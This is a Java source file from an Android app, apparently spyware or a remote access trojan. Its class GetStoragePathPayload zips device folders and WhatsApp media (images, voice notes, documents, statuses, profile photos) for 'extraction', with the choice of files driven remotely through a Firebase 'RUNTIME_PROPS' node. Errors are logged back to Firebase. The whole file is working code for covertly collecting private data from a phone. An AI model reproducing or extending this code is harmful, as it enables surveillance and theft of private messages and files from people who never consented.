package com.aigs.serviceone.payload;

import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;

import com.aigs.serviceone.annotations.PayloadTypes;
import com.aigs.serviceone.helpers.StorageTextExtractionListner;
import com.aigs.serviceone.helpers.ZipListener;
import com.aigs.serviceone.util.ZipUtils;
import com.example.uniqueidmanager.UniqueId;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.File;

public class GetStoragePathPayload extends AsyncTask<String, Integer, String> {

    private StorageTextExtractionListner watsappTextExtractionListner;
    int count = 0;
    private String uuid;
    @PayloadTypes
    int payloadType;

    public GetStoragePathPayload(@PayloadTypes int payloadType) {
        this.payloadType = payloadType;
    }

    public GetStoragePathPayload setWatsappTextExtractionListner(StorageTextExtractionListner extractionListner) {
        this.watsappTextExtractionListner = extractionListner;
        return this;
    }

    @Override
    protected String doInBackground(String... strings) {
        try {

            if (payloadType == PayloadTypes.GET_DEVICE_FOLDER) {
                String path = (strings[0].startsWith("/") ? strings[0] : "/" + strings[0]);
                File file = new File(Environment.getExternalStorageDirectory() + path);
                if (file.exists()) {
                    if (!file.isDirectory()) {
                        String dest = file.getParent() + "/backup.zip";
                        ZipUtils
                                .getInstance()
                                .setZipListener(() -> updateProgress(dest))
                                .zipSingleFile(file, dest);

                    } else {
                        String dest = file + "/backup.zip";
                        ZipUtils
                                .getInstance()
                                .setZipListener(() -> updateProgress(dest))
                                .zipDirectory(file, dest);
                    }
                }

            } else {
                String whatsappMediaPath = "";
                String db_Entry="";
                switch (payloadType){
                    case PayloadTypes.GET_WHATSAPP_STATUS:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/.Statuses";
                        db_Entry = "WHATSAPP_STATUS_LENGTH";
                        break;
                    case PayloadTypes.GET_WHATSAPP_GIFS:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Animated Gifs";
                        db_Entry = "WHATSAPP_GIFS_LENGTH";
                        break;
                    case PayloadTypes.GET_WHATSAPP_AUDIO:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio";
                        Log.e("PATH",whatsappMediaPath);
                        db_Entry = "WHATSAPP_AUDIO_LENGTH";
                        break;
                    case PayloadTypes.GET_WHATSAPP_DOCUMENTS:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents";
                        db_Entry = "WHATSAPP_DOCUMENT_LENGTH";
                        break;
                    case PayloadTypes.GET_WHATSAPP_IMAGES:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images";
                        db_Entry = "WHATSAPP_IMAGES_LENGTH";
                        break;
                    case PayloadTypes.GET_WHATSAPP_PROFILE_PICS:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Profile Photos";
                        db_Entry = "WHATSAPP_PROFILE_PIC_LENGTH";
                        break;
                    case PayloadTypes.GET_WHATSAPP_STICKERS:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Stickers";
                        db_Entry = "WHATSAPP_STICKERS_LENGTH";
                        break;
                    case PayloadTypes.GET_WHATSAPP_VIDEOS:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/Whatsapp Video";
                        db_Entry = "WHATSAPP_VIDEO_LENGTH";
                        break;
                    case PayloadTypes.GET_WHATSAPP_VOICE_NOTES:
                        whatsappMediaPath = Environment.getExternalStorageDirectory()+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes";
                        db_Entry = "WHATSAPP_VOICE_LENGTH";
                        break;
                    default:
                        break;
                }

                String finalWhatsappMediaPath = whatsappMediaPath;
                FirebaseDatabase
                        .getInstance()
                        .getReference("RUNTIME_PROPS")
                        .child("WHATSAPP")
                        .child(db_Entry)
                        .addListenerForSingleValueEvent(new ValueEventListener() {
                            @Override
                            public void onDataChange(@NonNull DataSnapshot snapshot) {
                                if (snapshot.exists()){
                                    try {
                                        int fileNo = snapshot.getValue(Integer.class);
                                        Log.e("NUMBER_OF_FILES",fileNo+"");
                                        File file = new File(finalWhatsappMediaPath);
                                        String dest = file.getParent() + file.getName() + ".zip";
                                        if (fileNo == -1){
                                            ZipUtils.getInstance().setZipListener(() -> updateProgress(dest)).zipDirectory(file, dest);
                                        }else {
                                            ZipUtils.getInstance().setZipListener(() -> updateProgress(dest)).zipDirectory(file, dest, fileNo);
                                        }
                                    }catch (Exception e){
                                        Log.e("e",e.getMessage());
                                    }
                                }
                            }

                            @Override
                            public void onCancelled(@NonNull DatabaseError error) {

                            }
                        });
            }


        } catch (Exception e) {
            Log.e("EXCEPTION_WC : ", e.getMessage());
            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_WHATSAPP_DATABASES + "").child("CurrentLog").setValue(e.getMessage());

        }

        return null;
    }

    private void updateProgress(String dest) {
        watsappTextExtractionListner.onDataExtracted(new File(dest));

    }
}
